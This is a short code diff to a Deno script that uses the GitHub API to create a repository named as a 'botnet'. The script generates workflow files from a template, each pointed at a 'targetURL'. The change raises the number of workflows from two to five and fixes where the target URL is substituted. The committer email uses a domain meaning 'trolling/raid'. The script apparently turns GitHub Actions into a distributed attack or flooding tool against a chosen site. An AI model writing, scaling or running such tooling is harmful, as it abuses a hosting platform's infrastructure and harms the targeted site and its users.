@@ -18,7 +18,7 @@ console.log("[!] Created");
 const afterOwner = botnet.data.owner.login;
 const afterRepo = botnet.data.name;
 
-const array = Array.from({ length: 2 }).fill(0).map(async (_v, i) => {
+const array = Array.from({ length: 5 }).fill(0).map(async (_v, i) => {
   console.log("[!] Create reg-" + i);
   const workflow = await octokit.rest.repos.createOrUpdateFileContents({
     owner: afterOwner,
@@ -29,8 +29,8 @@ const array = Array.from({ length: 2 }).fill(0).map(async (_v, i) => {
       (await Deno.readTextFile("./objects/index.yml")).replace(
         /{{base}}/g,
         "https://github.com/" + botnetURL,
-      ),
-    ).replace(/{{url}}/g, targetURL),
+      ).replace(/{{url}}/g, targetURL),
+    ),
     committer: {
       name: `SetupBot`,
       email: "amex@荒らし.com",
